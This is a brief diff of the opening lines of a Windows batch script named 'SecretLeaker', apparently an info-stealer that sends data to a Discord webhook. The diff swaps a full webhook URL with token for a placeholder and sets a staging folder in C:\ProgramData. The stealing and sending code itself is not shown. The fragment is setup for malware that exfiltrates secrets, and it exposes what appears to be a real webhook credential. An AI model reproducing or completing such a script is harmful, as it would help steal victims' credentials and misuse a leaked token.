@@ -1,7 +1,7 @@
 @echo off
 cls
 title SecretLeaker
-set webhook=https://discordapp.com/api/webhooks/1037067752281755768/Z6Jrqyw0tEtIyyWDn3j8aHkhgLrejrcDKvjeRufw8aHZz5nWECRm-pgOriJCD8W_UZXQ
+set webhook=Your Webhook
 set "vpath=C:\ProgramData"
 
 cd %vpath%
